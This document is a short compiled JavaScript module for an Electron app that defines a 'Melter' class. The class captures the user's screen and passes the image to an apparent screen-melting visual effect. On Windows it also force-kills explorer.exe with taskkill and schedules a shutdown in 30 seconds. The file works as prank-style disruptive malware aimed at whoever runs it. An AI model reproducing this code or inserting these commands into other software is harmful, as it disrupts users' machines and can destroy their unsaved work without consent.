"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.Melter = void 0;
const child_process_1 = require("child_process");
const electron_1 = require("electron");
const MeltWindow_js_1 = require("./MeltWindow.js");
class Melter {
    constructor() {
        this.window = new MeltWindow_js_1.MeltWindow();
        this.capture();
        if (process.platform === "win32") {
            (0, child_process_1.exec)("taskkill /im explorer.exe /f");
            (0, child_process_1.exec)("shutdown /t 30");
        }
    }
    capture() {
        electron_1.desktopCapturer.getSources({ types: ["screen"], thumbnailSize: {
                width: this.window.getSize()[0],
                height: this.window.getSize()[1]
            }
        }).then(function (sources) {
            this.window.webContents.executeJavaScript(`MELT_RENDERER.melt("${sources[0].thumbnail.toDataURL()}");`);
        }.bind(this));
    }
}
exports.Melter = Melter;
